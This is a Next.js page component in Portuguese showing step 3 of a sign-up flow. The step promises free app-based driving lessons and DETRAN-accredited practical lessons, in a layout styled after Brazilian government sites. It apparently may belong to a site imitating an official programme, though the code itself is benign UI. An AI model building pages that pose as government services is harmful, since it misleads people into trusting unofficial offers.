'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import GovLayout from '@/components/GovLayout';

export default function AulasPage() {
  const router = useRouter();
  const [userName, setUserName] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    const userData = localStorage.getItem('usuarioLogado');
    if (userData) {
      const user = JSON.parse(userData);
      const primeiroNome = user.nome?.split(' ')[0] || '';
      setUserName(primeiroNome.toUpperCase());
    }
  }, []);

  const handleContinue = () => {
    setIsLoading(true);
    setTimeout(() => {
      router.push('/emissao');
    }, 500);
  };

  const handleBack = () => {
    router.push('/aplicativo');
  };

  return (
    <GovLayout userName={userName} breadcrumbItems={['Cadastro', 'Aulas']}>
      <div className="w-full">
        <div>
          <div className="flex items-center gap-3 mb-4">
            <div className="flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium">3</div>
            <p className="font-semibold text-base">Aulas Teóricas e Práticas</p>
          </div>
          
          <div className="space-y-3 flex flex-col items-center">
            <div className="flex justify-center mb-4">
              <Image 
                src="/mockup-app.png" 
                alt="Aulas Teóricas e Práticas" 
                width={480}
                height={461}
                className="w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg"
                style={{ maxHeight: '400px' }}
              />
            </div>
            
            <div className="bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]">
              <p className="text-gray-700 leading-relaxed text-base">
                Suas aulas teóricas serão realizadas 100% pelo aplicativo, totalmente GRATUITAS! Para a parte prática, você precisará fazer apenas 2 horas de aula com um instrutor credenciado pelo DETRAN. Se você for aprovado para a gratuidade do programa, essas aulas práticas também serão gratuitas!
              </p>
            </div>
          </div>
          
          <div className="flex justify-center gap-4 mt-6">
            <button 
              type="button" 
              onClick={handleBack}
              className="border-2 border-[#1351B4] text-[#1351B4] font-semibold py-3 px-8 rounded-full text-base transition-all hover:bg-[#1351B4]/5 min-w-[140px]"
            >
              Voltar
            </button>
            <button 
              type="button" 
              onClick={handleContinue}
              disabled={isLoading}
              className="bg-[#1351B4] hover:bg-[#0D3C8C] text-white font-semibold py-3 px-8 rounded-full text-base transition-all transform hover:scale-105 shadow-lg flex items-center justify-center gap-2 min-w-[160px] disabled:opacity-70"
            >
              {isLoading ? (
                <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent"></div>
              ) : (
                'Avançar'
              )}
            </button>
          </div>
        </div>
      </div>
    </GovLayout>
  );
}
